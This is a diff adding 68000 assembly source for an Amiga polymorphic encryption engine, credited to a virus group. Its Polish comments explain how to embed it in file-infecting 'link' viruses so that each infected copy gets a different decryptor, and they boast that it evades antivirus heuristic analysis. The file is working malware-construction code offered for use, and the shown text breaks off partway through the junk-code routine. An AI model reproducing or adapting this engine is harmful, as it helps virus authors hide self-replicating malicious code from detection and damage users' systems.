@@ -1,0 +1,1181 @@
+;=============================================================================
+;
+;	Poly Engine v1.0 by MaD roGEr/Viruses'R'US, Poland 2001
+;
+; engine length - 2028 ($7ec) bytes
+;
+;=============================================================================
+;Generator tworzy zmienne procedury deszyfrujace do stosowania w wirusach
+;typu link, uzywa przy tym ciagu licz pseudolosowych pochodzacych z generatora
+;zbudowanego w oparciu o algorytm tworzacy tablice CRC32. Dla potrzeb tego
+;generatora zostal on zmieniony, przy jego uzyciu mozna generowac ciag liczb
+;o dowolnej dlugosci (tutaj 1536 bajtow). Wygenerowany dekoder nie zawiera
+;innych instrukcji niz instrukcje istotne dla deszyfrowania + instrukcje skoku
+;do nastepnego bloku dekodera. Zostalo to zrobione celowo, chcialem
+;przetestowac skutecznosc takiego rozwiazania, zmniejsza to przy okazji
+;rozmiar generatora. Na poczatku dekoder umieszcza rejestry D0-A6 na stosie,
+;wirus musi potem zdjac te rejestry ze stosu. rozmiarem operacji jest zawsze
+;bajt, a cache procesora jest czyszczony po deszyfracji instrukcja 
+;JSR	_LV0_CacheClearU(execbase) lub podobnie dzialajacym blokiem. Dekodery
+;w moich testach mialy dlugosc od 160 - ~800 bajtow. Aby prawidlowo
+;zaimplementowac ten generator w swoim wirusie, pownienes wywolac go taka
+;procedura:
+;	
+;	moveq	#0,d0		;pobranie adresu wartosci seed, jest to liczba
+;				;na podstawie ktorej generator liczb losowych
+;				;tworzy ciag danych. Jesli nie bedziesz jej
+;				;zmienial, wszystkie kopie wirusa beda
+;				;identyczne, lecz mozesz tez regulowac czas, po
+;				;ktorym zostanie wygenerowany nowy dekoder.
+;				;Np.: jesli po kazdym wywolaniu generatora
+;				;dodasz 1 do tej liczby (liczba jest .L), wirus
+;				;bedzie inny w kazdym pliku, mozesz zmieniac te
+;				;wartosc np: co 10 lub 20 infekcji, otrzymasz
+;				;w ten sposob powolnie polimorficznego wirusa.
+;				;mozesz tez przed wywolaniem generatora wywolac 
+;				;procedure LV0_DateStamp() i uzywac wartosci
+;				;zwroconej przez ta procedure jako seed, wtedy
+;				;wirus bedzie zmienial dekoder raz dziennie.
+;
+;	call	poly_engine	;wywolanie generatora.
+;
+;				;Return: A0 - adres seed (liczba .L) 
+;
+;				;Teraz mozesz zmienic wartosc seed i oczywiscie
+;				;wywolac procedure CacheClearU()
+;
+;	move.w	#virus_end-virus_start,d0	;umiesc w rejestrze D0
+;				;rozmiar wirusa do zaszyfrowania
+;
+;	lea	virus_start(pc),a0		;umiesc tutaj adres poczatku
+;				;wirusa
+;
+;	lea	buffer(pc),a1	;tutaj umiesc adres, gdzie umiescic
+;				;zaszyfrowanego wirusa z dekoderem, pod tym
+;				;adresem zostanie umieszczony zaszyfrowany
+;				;wirus+dekoder na poczatku. pamiec zaalokowana
+;				;pod tym adresem powinna miec rozmiar
+;				;conajmniej (wirus + generator + 1.5 kB).
+;				;ta ostatnia wartosc zostala dobrana dla
+;				;bezpieczenstwa, w przypadku wirusa np: 1.5 kB
+;				;zalecam alokacje 10 kB pamieci ====>
+;				;1.5 kB to oczywiscie rozmiar wirusa bez
+;				;generatora
+;
+;	call	poly_engine	;ponowne wywolanie generatora.
+;
+;				;Return: D0 - rozmiar wirusa razem z dekoderem
+;				;i wyrownaniem do 4 bajtow umieszczonego
+;				;w buforze o adresie w A1  
+;
+;	Tutaj mozesz wywolac procedure ktora zapisze wirusa do pliku.
+;
+;	UWAGA!!!!!
+;------------------
+;Generator liczb losowych generuje je pod adreses SysStkLower(execbase), jest
+;to obszar pamieci malo uzywany przez system i zapis pod ten adres nie grozi
+;zawieszeniem systemu, nie powinienes jednak umieszczac wirusa pod tym adresem
+;gdyz jego kod zostanie zamazany przez liczby losowe z generatora.
+;
+;
+;Pomimo prostoty tworzonych dekoderow, programy antywirusowe moga miec znaczne
+;problemy z wykryciem czegos takiego, umykaja one wszelkiej analizie 
+;heurystycznej, przyklad:
+;
+;. . .
+;
+;$3e4bc:	6100000a		bsr.w	$3e4c8
+;$3e4c0:	3217			move.w	(a7),d1
+;$3e4c2:	2ab8baea		move.l	-4516.w,(a5)
+;$3e4c6:	0df84fef		bset	d6,$4fef.w
+;$3e4ca:	00042f0e		ori.b	#$e,d4
+; . . .
+;
+;a w rzeczywistosci:
+;
+;. . .
+;
+;$3e4bc:	6100000a		bsr.w	$3e4c8
+;$3e4c0:	32172ab8baea0df8 <===	[SMIECI]
+;$3e4c8:	4fef0004		lea	4(sp),sp
+;$3e4cc:	2f0e			move.l	a6,-(sp)
+; . . .
+;
+;
+;1. Input regs:
+;--------------
+;D0.w - length of code to crypt 
+;A0.l - pointer to code to encrypt
+;A1.l - where to store encrypted code
+;
+;Output regs:
+;------------
+;D0.l - length of virus + decoders 
+;
+;
+;2. Input regs:
+;--------------
+;D0.l - NULL
+;
+;Output regs:
+;------------
+;A0.l - ptr to seed value (seed value is .L)
+;==========================================================================
+
+;	lea	_MutaGen(pc),a0			;do testow
+;	lea	buffer(pc),a1			;
+;	move.w	#buffer-_MutaGen,d0		;
+;	bsr.s	_MutaGen			;
+;	rts					;
+;						;	
+;	dc.l	buffer-_MutaGen			;
+
+_MutaGen
+	tst.l	d0
+	bne.s	_main_MutaGen
+	lea	seed(pc),a0
+	rts
+
+	dc.b	'[Poly Engine 1.0 by MaD roGEr]'
+
+_main_MutaGen
+
+	movem.l	d1-a6,-(sp)
+
+	lea	_tablica_argumentow(pc),a5
+	move.w	d0,length_of_code_to_crypt-_tablica_argumentow(a5)
+	subq.w	#1,d0
+	move.w	d0,_crypt_count+2-_tablica_argumentow(a5)
+	move.l	a0,code_to_encrypt-_tablica_argumentow(a5)
+	move.l	a1,where_to_store_crypted_code-_tablica_argumentow(a5)
+	bsr.w	_CacheClear
+	move.l	4.w,a6
+	move.l	58(a6),a0		;SysStkLower
+	
+	bsr.w	_rnd
+	move.l	where_to_store_crypted_code(pc),a1
+	lea	registers(pc),a3
+
+get_nonzero_value
+	tst.b	-(a0)
+	beq.s	get_nonzero_value
+
+get_random_AX
+	move.b	-(a0),d0
+	and.w	#7,d0
+	cmpi.b	#7,d0
+	beq.s	get_random_AX
+	move.w	d0,(a3)+		;get random adress register
+
+get_random_DX
+	move.b	-(a0),d0		;get 2 random data registers
+	and.w	#7,d0
+	move.w	d0,(a3)+
+
+get_second_DX
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.w	d1,d0
+	
+	beq.s	get_second_DX
+	move.w	d1,(a3)+
+
+	move.b	-(a0),arg+1-_tablica_argumentow(a5)
+
+	moveq	#1,d3
+	moveq	#0,d2
+
+skladuj_rejestry_na_stosie
+
+	cmp.w	#16,d3
+	bge.s	_generuj_2_instrukcje
+
+	bsr.w	_add_shit
+
+	btst.b	#0,-(a0)
+	beq.s	_movem
+	
+_move_l	
+	move.w	d3,d4
+	neg.b	d4
+	and.w	#15,d4
+	tst.w	d4
+	cmpi.w	#16,d4
+	beq.s	_generuj_2_instrukcje
+
+	add.w	#$2eff,d4			;move.l	Xx,-(sp)
+	move.w	d4,(a1)+
+	addq.w	#1,d3
+	bra.s	skladuj_rejestry_na_stosie
+
+_movem
+	move.b	-(a0),d0
+	and.w	#15,d0
+
+	move.w	#$48e7,(a1)+			;movem.l Xx-Xx,-(sp)
+	clr.w	d2
+
+_movem_loop
+	bset	d3,d2
+	addq.w	#1,d3
+	cmp.w	#16,d3
+	beq.s	zakoncz_skladowanie_rejestrow_na_stosie
+	dbf	d0,_movem_loop
+	
+	move.w	d2,(a1)+
+	bra.s	skladuj_rejestry_na_stosie
+	
+zakoncz_skladowanie_rejestrow_na_stosie
+	move.w	d2,(a1)+
+	
+_generuj_2_instrukcje
+	bsr.w	_add_shit
+
+	move.w	_counter_reg(pc),d7	
+	bsr.w	NULL_register
+	bsr.w	_add_shit
+	move.w	length_of_code_to_crypt(pc),d6
+	bsr.w	dodaj_parametr_do_rejestru
+
+	bsr.w	_add_shit
+
+;_generuj_3_instrukcje
+
+	move.w	_adress_reg(pc),d7
+	bsr.w	generuj_lea
+	bsr.w	_add_shit	
+;_generuj_4_instrukcje
+
+	move.w	_arg_reg(pc),d7
+	bsr.w	NULL_register
+	move.w	arg(pc),d6
+	bsr.w	dodaj_parametr_do_rejestru
+	bsr.w	_add_shit
+
+	move.l	a1,adres_petli-_tablica_argumentow(a5)			
+
+	bsr.w	generuj_petle_dekodujaca	
+
+_instr4_generated_ok
+	bsr.w	_add_shit
+
+jmp_case2
+
+	btst.b	#0,-(a0)
+	beq.s	_SUBQ
+	move.w	#$440,d0		;sub.l	#1,Dx
+	add.w	_counter_reg(pc),d0
+	move.w	d0,(a1)+
+	move.w	#1,(a1)+
+	bra.s	_ustal_skok
+
+_SUBQ
+	move.w	#$5340,d0		;subq.l	#1,Dx
+	add.w	_counter_reg(pc),d0
+	move.w	d0,(a1)+
+
+_ustal_skok
+
+	move.b	-(a0),d1
+	and.b	#7,d1
+	subq.b	#1,d1
+	bne.s	_Bcc0
+	moveq	#$6c,d7			;bge
+	bra.s	get_offset
+
+_Bcc0
+	subq.b	#1,d1
+	bne.s	_Bcc1
+	moveq	#$66,d7			;bne
+	bra.s	get_offset
+	
+_Bcc1
+	subq.b	#1,d1
+	bne.s	_Bcc2
+	moveq	#$6e,d7			;bgt
+	bra.s	get_offset
+
+_Bcc2
+	subq.b	#1,d1
+	bne.s	_Bcc3
+	moveq	#$62,d7			;bhi
+	bra.s	get_offset
+
+_Bcc3
+	moveq	#$6a,d7			;bpl
+
+get_offset
+	bsr.w	insert_offset
+	cmp.w	#$ff80,d0
+	bcs.s	_word_offset
+
+	lsl.l	#8,d7
+	move.b	d0,d7
+	move.w	d7,(a1)+
+	bra.s	jmp_end
+
+_word_offset
+	lsl.l	#8,d7
+	move.w	d7,(a1)+
+	move.w	d0,(a1)+
+	
+jmp_end
+
+	bsr.w	_add_shit
+
+;move.l	4.w,a6
+_NXT
+	move.b	-(a0),d1
+	and.w	#3,d1
+	bne.s	case_a
+	move.l	#$2c780004,(a1)+	;move.l	4.w,a6
+	bra.s	_m_move
+
+case_a
+	subq.w	#1,d1
+	bne.s	case_b
+	move.l	#$2c790000,(a1)+	;move.l	4.l,a6
+	move.w	#4,(a1)+
+	bra.s	_m_move
+
+case_b
+	subq.w	#1,d1
+	bne.s	case_c
+	btst.b	#0,-(a0)
+	beq.s	_word
+	
+	move.w	#$2f39,(a1)+		;move.l	4.l,-(sp)
+	clr.w	(a1)+
+	bra.s	_4
+_word
+	move.w	#$2f38,(a1)+		;move.l	4.w,-(sp)
+_4	
+	move.w	#$4,(a1)+
+
+	bsr.w	_add_shit
+	move.w	#$2c5f,(a1)+		;move.l	(sp)+,a6	
+	bra.s	_m_move
+
+case_c
+
+	move.b	-(a0),d1
+	and.w	#7,d1
+	move.w	d1,d3
+
+	move.w	#$7004,d0		;moveq #4,d0
+	rol.w	#7,d0
+	or.b	d1,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	bsr.w	_add_shit
+
+	move.w	#$2040,d0		;move.l d0,a0
+	addi.b	d3,d0
+	rol.w	#7,d0
+
+GET_R_AGAIN
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.b	#7,d1
+	beq.s	GET_R_AGAIN
+	
+	move.w	d1,d3
+	or.b	d1,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	bsr.w	_add_shit
+	
+	move.w	#$2c50,d0		;move.l	(a0),a6
+	add.b	d3,d0
+	move.w	d0,(a1)+
+
+_m_move
+	bsr.w	_add_shit
+
+case_0	move.b	-(a0),d1
+	and.w	#3,d1
+	bne.s	case_1
+	bsr.b	_jsr1
+	bra.s	fix_lea_offset
+
+case_1
+	subq.w	#1,d1
+	bne.s	case_2
+	bsr.b	_jsr2
+	bra.s	fix_lea_offset
+
+case_2
+	bsr.b	_jsr3
+
+fix_lea_offset
+	bsr.w	_add_shit
+
+	move.l	lea_adress(pc),d0	;ustaw offset LEA
+	move.l	d0,a0
+	move.l	a1,d1
+	sub.l	d0,d1
+	add.w	d1,2(a0)
+
+	move.l	a1,d7
+	move.l	a1,_crypt_adr+2-_tablica_argumentow(a5)
+	moveq	#0,d0
+	move.w	length_of_code_to_crypt(pc),d0
+	subq.w	#1,d0
+	move.l	code_to_encrypt(pc),a0
+_copy_code
+	move.b	(a0)+,(a1)+
+	dbf	d0,_copy_code
+
+	bsr.w	_CacheClear
+	bsr.w	_crypt_routine
+	move.l	where_to_store_crypted_code(pc),d6
+	sub.l	d6,d7
+	add.w	length_of_code_to_crypt(pc),d7
+	addq.w	#4,d7
+	and.l	#$fffffffc,d7
+	move.l	d7,d0
+	
+end_MTE
+	movem.l	(sp)+,d1-a6
+	rts
+
+;-------------------------------------------------
+insert_offset
+	
+	move.l	a1,d1
+	move.l	adres_petli(pc),d3
+	sub.l	d1,d3
+	subq.w	#2,d3
+	move.w	d3,d0
+	rts
+;-------------------------------------------------
+_jsr1
+
+	bsr.s	_insert_move_636
+	move.l	d1,-(sp)
+	bsr.w	_add_shit
+
+	move.l	(sp)+,d1
+	move.l	#$4eb60000,d0		;jsr	(a6,d0.w)
+	add.b	d2,d0
+	rol.w	#4,d0
+	add.b	d1,d0
+	ror.w	#4,d0
+	move.l	d0,(a1)+
+	rts
+;---------------------------------------------------
+_jsr2	move.l	#$4eaefd84,(a1)+	;jsr	-636(a6)
+	rts
+;-------------------------------------------------
+_jsr3	
+	bsr.s	_insert_move_636
+	move.l	d1,-(sp)
+	bsr.w	_add_shit
+	
+	move.l	(sp)+,d1
+	move.l	#$20760002,d0		;move.l	2(a6,d0.w),a0
+	add.b	d2,d0
+	rol.w	#4,d0
+	add.b	d1,d0
+	ror.w	#4,d0
+
+get_reg_again
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.w	#6,d1
+	bge.s	get_reg_again
+
+	rol.l	#7,d0
+	add.b	d1,d0
+	ror.l	#7,d0
+	move.l	d0,(a1)+
+
+	bsr.w	_add_shit
+
+	move.w	#$4e90,d0		;jsr	(a0)
+	add.w	d1,d0
+	move.w	d0,(a1)+
+	rts
+
+;---------------------------------------------------
+
+_insert_move_636
+	move.l	#$303cfd84,d0		;move.w	#-636,d0
+	move.b	-(a0),d2
+
+		 ;12345678
+	and.w	#%01111100,d2
+	sub.w	d2,d0
+	
+	move.b	-(a0),d1
+	rol.l	#7,d0
+	and.w	#7,d1
+	add.b	d1,d0
+	ror.l	#7,d0
+	move.l	d0,(a1)+
+	rts
+;=================================
+NULL_register
+	move.b	-(a0),d0
+	and.b	#7,d0
+	beq.s	_instr2_movel
+	cmp.b	#1,d0
+	beq.s	_instr2_movew
+	cmp.b	#2,d0
+	beq.s	_instr2_moveq
+	cmp.b	#3,d0
+	beq.s	_instr2_subl
+	cmp.b	#4,d0
+	beq.s	_instr2_clrl
+	cmp.b	#5,d0
+	beq.s	_instr2_eorl
+	cmp.b	#6,d0
+	beq.b	_instr2_andl
+	bra.s	_instr2_push
+	
+_instr2_movel
+
+	move.w	#$203c,d0			;move.l	#0,d0
+	rol.w	#7,d0
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	clr.l	(a1)+
+	rts
+
+_instr2_movew
+	move.w	#$303c,d0			;move.w	#0,d0
+	rol.w	#7,d0
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	clr.w	(a1)+
+	rts
+
+_instr2_clrl					;clr.l	d0
+	move.w	#$4280,d0
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	rts
+	
+_instr2_subl					;sub.l	d0,d0
+	move.w	#$9080,d0
+	bra.s	_move2b
+
+_instr2_moveq					;moveq	#0,d0
+	move.w	#$7000,d0
+	rol.w	#7,d0
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	rts
+
+_instr2_eorl					;eor.l	d0,d0
+	move.w	#$b180,d0
+	bra.s	_move2b
+
+_instr2_andl
+	move.w	#$280,d0			;and.l	#0,d0
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	clr.l	(a1)+
+	rts
+
+_instr2_push					;move.l	#length,-(sp)	
+	move.w	#$2f3c,d0
+	move.w	d0,(a1)+
+	clr.l	(a1)+
+	bsr.w	_add_shit
+	move.w	#$201f,d0			;move.l	(sp)+,d0
+	rol.w	#7,d0	
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	rts
+	
+_move2b
+	add.b	d7,d0
+	rol.w	#7,d0
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	rts
+
+;==================================================
+dodaj_parametr_do_rejestru
+
+	move.b	-(a0),d0
+	and.b	#7,d0
+	beq.s	_instr2_a_subw
+	cmp.b	#1,d0
+	beq.s	_instr2_a_subl
+	cmp.b	#2,d0
+	beq.s	_instr2_a_eorw
+	cmp.b	#3,d0
+	beq.s	_instr2_a_addw
+	cmp.b	#4,d0
+	beq.s	_instr2_a_orw	
+	cmp.b	#5,d0
+	beq.s	_instr2_a_eorl
+	cmp.b	#6,d0
+	beq.s	_instr2_a_addl
+	bra.s	_instr2_a_orl
+
+_instr2_a_subw
+	move.w	#$0440,d0		;sub.w	#-length,d0
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	move.w	d6,d0
+	neg.w	d0
+	move.w	d0,(a1)+	
+	rts
+	
+_instr2_a_subl
+	move.w	#$0480,d0		;sub.l	#-length,d0	
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	moveq	#0,d0
+	move.w	d6,d0
+	neg.l	d0
+	move.l	d0,(a1)+
+	rts
+
+_instr2_a_eorl				;eor.l	#length,d0
+	move.w	#$0a80,d0
+	bra.s	_instr2_a_orl+4
+	
+_instr2_a_eorw
+	move.w	#$0a40,d0		;eor.w	#length,d0
+	bra.s	_instr2_a_orw+4
+
+_instr2_a_addl
+	move.w	#$680,d0		;add.l	#length,d0
+	bra.s	_instr2_a_orl+4
+		
+_instr2_a_addw
+	move.w	#$640,d0		;add.w	#length,d0
+	bra.s	_instr2_a_orw+4
+
+_instr2_a_orl
+	move.w	#$80,d0			;or.l	#length,d0
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	clr.w	(a1)+
+	move.w	d6,d0
+	move.w	d0,(a1)+
+	rts
+	
+_instr2_a_orw
+	move.w	#$40,d0			;or.w	#length,d0
+	add.b	d7,d0
+	move.w	d0,(a1)+
+	move.w	d6,d0
+	move.w	d0,(a1)+	
+	rts
+
+
+;=======================================
+generuj_lea
+
+	move.l	a1,lea_adress-_tablica_argumentow(a5)
+
+	btst	#0,-(a0)
+	beq.s	_lea
+	move.l	#$487afffe,(a1)+		;pea	-2(pc)
+	bsr.w	_add_shit
+	move.w	#$205f,d0			;move.l	(sp)+,Ax
+	rol.w	#7,d0
+	add.b	d7,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	rts
+
+_lea	move.l	#$41fafffe,d0			;lea	-2(pc),a0
+	rol.l	#7,d0
+	add.b	d7,d0
+	ror.l	#7,d0
+	move.l	d0,(a1)+
+	rts
+;=================================
+generuj_petle_dekodujaca
+
+	move.b	-(a0),d0
+	and.b	#%111,d0
+	beq.s	_instr4_eor
+	cmp.b	#1,d0
+	beq.b	_instr4_add
+	cmp.b	#2,d0
+	beq.s	_instr4_sub
+	cmp.b	#3,d0
+	ble.s	_instr4_rol
+	cmp.b	#4,d0
+	beq.b	_instr4_ror
+	cmp.b	#5,d0
+	beq.s	_instr4_not
+;	cmp.b	#6,d0
+;	beq.s	_instr4_neg
+
+_instr4_bchg
+;	move.l	#$08500140,d2		;bchg	d0,(a0); bchg d0,d0
+;	move.w	#$340,d3		
+;	moveq	#5,d4
+;	bra.s	_instr4_generuj		
+
+_instr4_neg
+	move.l	#$44104400,d2		;neg.b	(a0); neg.b d0
+	move.w	#$4400,d3	
+	moveq	#1,d4
+	bra.s	_instr4_generuj
+
+_instr4_not
+	move.l	#$46104600,d2		;not.b	(a0); not.b d0
+	move.w	#$4600,d3
+	moveq	#1,d4
+	bra.s	_instr4_generuj
+
+_instr4_ror
+	move.l	#$e038,d2		;ror.b	d0,d0
+	move.w	#$e338,d3		;rol.b	d1,d0
+	moveq	#2,d4
+	bra.s	_instr4_generuj
+	
+_instr4_rol
+	move.l	#$e138,d2		;rol.b	d0,d0
+	move.w	#$e238,d3		;ror.b	d1,d0 <= NEEDED!!
+	moveq	#2,d4
+	bra.s	_instr4_generuj
+	
+_instr4_eor
+	move.l	#$b110b100,d2		;eor.b	d0,(a0); eor.b d0,d0
+	move.w	#$b300,d3		;eor.b  d1,d0
+	moveq	#3,d4	
+	bra.s	_instr4_generuj
+
+_instr4_sub
+	move.l	#$91109000,d2		;sub.b	d0,(a0); sub.b d0,d0
+	move.w	#$d001,d3		;add.b	d1,d0
+	moveq	#4,d4
+	bra.s	_instr4_generuj
+
+_instr4_add
+	move.l	#$d110d000,d2		;add.b	d0,(a0); add.b d0,d0
+	move.w	#$9001,d3		;sub.b	d1,d0
+	moveq	#4,d4
+
+_instr4_generuj
+
+	cmpi.b	#2,d4			;ROx.b ??
+	beq.s	_instr4_adresowanie_bezp
+	tst.b	-(a0)		
+	bmi.b	_instr4_adresowanie_posr
+
+_instr4_adresowanie_bezp
+	move.w	#$1010,d0		;move.b (a0),d0
+	add.w	_adress_reg(pc),d0
+	rol.w	#7,d0
+
+_instr4_ror_rol_getrnd
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.w	_counter_reg(pc),d1
+	beq.s	_instr4_ror_rol_getrnd
+	cmp.w	_arg_reg(pc),d1
+	beq.s	_instr4_ror_rol_getrnd
+
+	add.b	d1,d0
+	move.w	d1,d7
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	
+	cmpi.b	#1,d4
+	beq.s	_instr4_generate_not_bezp
+	cmpi.b	#2,d4
+	beq.s	_instr4_generate_ror_bezp
+	cmpi.b	#3,d4
+	beq.s	_instr4_generate_eor_bezp
+	bra.s	_instr4_generate_sub_bezp
+	
+_instr4_generate_not_bezp
+_instr4_generate_neg_bezp
+
+	add.b	d7,d2
+	bra.s	_instr4_adresowanie_bezp_2
+
+_instr4_generate_rol_bezp
+_instr4_generate_ror_bezp
+_instr4_generate_eor_bezp
+
+	add.b	d7,d2
+	rol.w	#7,d2
+	add.w	_arg_reg(pc),d2
+	ror.w	#7,d2
+	bra.s	_instr4_adresowanie_bezp_2
+
+_instr4_generate_sub_bezp
+_instr4_generate_add_bezp
+
+	add.w	_arg_reg(pc),d2
+	rol.w	#7,d2
+	add.w	d7,d2
+	ror.w	#7,d2
+		
+_instr4_adresowanie_bezp_2
+
+	movem.l	d2/d3,-(sp)
+	bsr.w	_add_shit
+	movem.l	(sp)+,d2/d3
+	move.w	d2,(a1)+
+	lea	_crypt_instr(pc),a2
+	move.w	d3,(a2)
+
+	bsr.w	_add_shit
+	move.w	#$1080,d0		;move.b	d0,(a0)
+	add.b	d7,d0
+	rol.w	#7,d0
+	add.w	_adress_reg(pc),d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	bra.s	_inc_adress
+
+_instr4_adresowanie_posr
+	swap	d2
+	cmpi.b	#1,d4
+	beq.s	_instr4_adresowanie_posr_not
+	cmpi.b	#2,d4
+	beq.s	_instr4_adresowanie_posr_ror
+	cmp.b	#3,d4
+	beq.s	_instr4_adresowanie_posr_eor
+
+_instr4_adresowanie_posr_add
+_instr4_adresowanie_posr_sub
+
+	add.w	_adress_reg(pc),d2
+	rol.w	#7,d2
+	add.w	_arg_reg(pc),d2
+	ror.w	#7,d2
+	bra.s	_2
+
+_instr4_adresowanie_posr_not
+_instr4_adresowanie_posr_neg
+
+	add.w	_adress_reg(pc),d2
+	bra.s	_2
+
+_instr4_adresowanie_posr_eor
+
+	add.w	_adress_reg(pc),d2
+	rol.w	#7,d2
+	add.w	_arg_reg(pc),d2
+	ror.w	#7,d2
+	bra.s	_2
+
+_instr4_adresowanie_posr_rol
+_instr4_adresowanie_posr_ror
+
+	add.w	_adress_reg(pc),d2
+	rol.w	#7,d2
+	add.w	_arg_reg(pc),d2
+	ror.w	#7,d2
+_2
+	move.w	d2,(a1)+
+	lea	_crypt_instr(pc),a2
+	move.w	d3,(a2)
+			
+_inc_adress
+	move.b	-(a0),d0
+	and.w	#3,d0
+	beq.s	_addl
+	cmp.b	#1,d0
+	beq.s	_addq
+;	cmp.b	#2,d0
+;	beq.s	_subl
+
+_subl
+	move.w	#$91fc,d0			;sub.l	#-1,a0
+	rol.w	#7,d0
+	add.w	_adress_reg(pc),d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	moveq	#-1,d0
+	move.l	d0,(a1)+
+	rts
+
+_addl
+	move.w	#$d1fc,d0			;add.l	#1,a0
+	rol.w	#7,d0
+	add.w	_adress_reg(pc),d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	moveq	#1,d0
+	move.l	d0,(a1)+
+	rts
+		
+_addq
+	move.w	#$5288,d0			;addq.l	#1,a0
+	add.w	_adress_reg(pc),d0
+	move.w	d0,(a1)+
+	rts
+
+_instr4_eor_add_sub_imm
+	move.w	#$1010,d0			;move.b	(a0),d0
+	add.w	_adress_reg(pc),d0
+	rol.w	#7,d0
+
+_instr4_eor_getrnd
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.w	_counter_reg(pc),d1
+	beq.s	_instr4_eor_getrnd
+	cmp.w	_arg_reg(pc),d1
+	beq.s	_instr4_eor_getrnd
+
+	add.b	d1,d0
+	move.l	d1,-(sp)
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	bsr.s	_add_shit
+	move.w	#$9000,d0		;(eor_add_sub).b d0,d0
+	rol.w	#4,d0
+	bset	d2,d0
+	ror.w	#4,d0
+
+	move.l	(sp),d1
+	add.b	d1,d0
+	rol.w	#7,d0
+	add.w	_arg_reg(pc),d0
+	ror.w	#7,d0
+
+_instr4_eor_end
+	move.w	d0,(a1)+
+	bsr.s	_add_shit
+
+	bsr.s	_add_shit
+
+	move.w	#$10c0,d0			;move.b	d0,(a0)+
+	move.l	(sp)+,d1
+	add.b	d1,d0
+	rol.w	#7,d0
+	add.w	_adress_reg(pc),d0
+	ror.w	#7,d0
+	tst.b	-(a0)
+	bmi.b	_move_inc
+
+	bclr	#6,d0
+_move_inc
+	move.w	d0,(a1)+
+	btst	#6,d0
+	bne.b	_rts
+	bsr.s	_add_shit
+	move.w	#$5288,d0
+	add.w	_adress_reg(pc),d0
+	move.w	d0,(a1)+
+_rts	rts
+
+_add_shit
+	btst	#0,(a0)
+	beq.s	_rts
+	movem.l	d0/d1/d2,-(sp)
+	bsr.s	_shitter
+	movem.l	(sp)+,d0/d1/d2
+	rts
+
+_shitter
+	move.b	-(a0),d0
+	and.w	#$1e,d0
+	cmp.w	#8,d0
+	bmi.s	_add_shit
+	move.b	-(a0),d1
+	and.w	#7,d1
+	beq.w	_shit_bra_b
+	cmp.b	#1,d1
+	beq.w	_shit_bra_w
+	cmp.b	#2,d1
+	beq.w	_shit_jmp_pc
+	cmp.b	#3,d1
+	beq.s	_shit_jsr_pc
+	cmp.b	#4,d1
+	beq.w	_shit_bsr_b
+	cmp.b	#5,d1
+	beq.w	_shit_bsr_w
+	cmp.b	#6,d1
+	beq.s	_shit_pea
+
+_shit_lea
+	move.b	-(a0),d1
+	and.w	#7,d1
+	cmp.w	#6,d1
+	bge.s	_shit_lea
+	cmp.w	_adress_reg(pc),d1
+	beq.s	_shit_lea
+	move.w	d1,(a1)
+	add.w	#$2f08,(a1)+		;move.l	Ax,-(sp)
+	move.l	#$41fa0002,d2		;lea	next_block(pc),Ax
+	rol.l	#7,d2
+	add.w	d1,d2
+	ror.l	#7,d2
+	move.l	d2,(a1)+
+	add.w	d0,-2(a1)
+	move.w	#$4ed0,d2		;jmp	(Ax)
+	add.w	d1,d2
+	move.w	d2,(a1)+
+	move.l	d1,-(sp)
+	bsr.w	_do_shit_loop
+	move.l	(sp)+,d1
+	move.w	#$205f,d0		;move.l	(sp)+,Ax
+	rol.w	#7,d0
+	add.w	d1,d0
+	ror.w	#7,d0
+	move.w	d0,(a1)+
+	rts		
+		
+	
+_shit_pea
+	move.w	#$487a,(a1)+		;pea	next_block(pc)
+	move.w	d0,(a1)+
+	move.w	#$4e75,(a1)+		;rts
+	subq.w	#2,d0
+	bra.s	_do_shit_loop
+
+_shit_jsr_pc
+	move.w	#$4eba,(a1)+		;jsr	next_block(pc)
+	move.w	d0,(a1)+		;dec stack by 4
+	bsr.s	_do_shit_loop
+
+_shit_dec_stack
+	move.b	-(a0),d0
+	and.w	#3,d0
+	beq.s	_shit_lea_dec
+	cmp.b	#1,d0
+	beq.s	_shit_subq
+	cmp.b	#2,d0
+	beq.s	_shit_addl
+
+	move.w	#$9ffc,(a1)+		;sub.l	#-4,a7
+	moveq	#4,d0
+	neg.l	d0
+	move.l	d0,(a1)+
+	rts	
+
+_shit_addl
+	move.w	#$dffc,(a1)+		;add.l	#4,a7
+	moveq	#4,d0
+	move.l	d0,(a1)+
+	rts
+_shit_lea_dec
+	move.l	#$4fef0004,(a1)+	;lea	4(a7),a7	
+	rts
+_shit_subq
+	move.w	#$588f,(a1)+		;addq.l	#4,a7
+	rts
+
+_shit_bsr_w
+	move.w	#$6100,(a1)+
+	move.w	d0,(a1)+
+	bsr.s	_do_shit_loop
+	bra.s	_shit_dec_stack
+	
+_shit_bsr_b
+	move.w	d0,d1
+	add.w	#$60fe,d1
+	move.w	d1,(a1)+
+	bsr.s	_do_shit_loop
+	bra.s	_shit_dec_stack
+	
+_shit_jmp_pc
+	move.w	#$4efa,(a1)+
+	move.w	d0,(a1)+
+	bra.s	_do_shit_loop
+	
+_shit_bra_w
+	move.w	#$6000,(a1)+
+	move.w	d0,(a1)+
